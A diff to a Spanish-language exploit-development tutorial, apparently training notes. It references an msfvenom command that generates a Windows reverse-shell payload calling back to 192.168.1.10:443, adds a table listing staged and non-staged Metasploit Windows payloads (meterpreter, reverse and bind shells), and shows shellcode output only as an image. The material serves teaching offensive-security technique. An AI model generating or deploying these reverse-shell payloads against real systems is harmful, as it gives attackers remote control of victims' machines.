@@ -982,6 +982,18 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 EXITFUNC=thre
 
 - **_--format python_** → salida en formato Python: una variable/byte string lista para pegar en un script Python (ej. buf = b"\x90\x90...").
 
+Se ha escogido en este caso el shell_reverse_tcp, pero podría haber sido otro.
+
+| staged                               | non-staged                           | staged x64                            | non-staged x64                       |
+|--------------------------------------|--------------------------------------|---------------------------------------|--------------------------------------|
+| windows/exec                         | windows/powershell_reverse_tcp       | windows/x64/exec                      | windows/x64/meterpreter_bind_tcp     |
+| windows/meterpreter/reverse_http     | windows/powershell_bind_tcp          | windows/x64/meterpreter/bind_tcp      | windows/x64/meterpreter_reverse_http |
+| windows/meterpreter/reverse_tcp      | windows/meterpreter_reverse_tcp      | windows/x64/meterpreter/reverse_http  | windows/x64/meterpreter_reverse_tcp  |
+| windows/meterpreter/bind_tcp         | windows/meterpreter_reverse_http     | windows/x64/meterpreter/reverse_tcp   | windows/x64/shell_reverse_tcp        |
+| windows/shell/bind_tcp               | windows/meterpreter_bind_tcp         | windows/x64/shell/bind_tcp            | windows/x64/shell_bind_tcp           |
+| windows/shell/reverse_tcp            | windows/shell_bind_tcp               | windows/x64/shell/reverse_tcp         |                                      |
+|                                      | windows/shell_reverse_tcp            |                                       |                                      |
+
 Al ejecutarlo se genera el siguiente shellcode.
 
 <img width="1010" height="683" alt="image" src="https://github.com/user-attachments/assets/39c4cbff-15a3-4749-ab5d-bb0a6f2c8af1" />
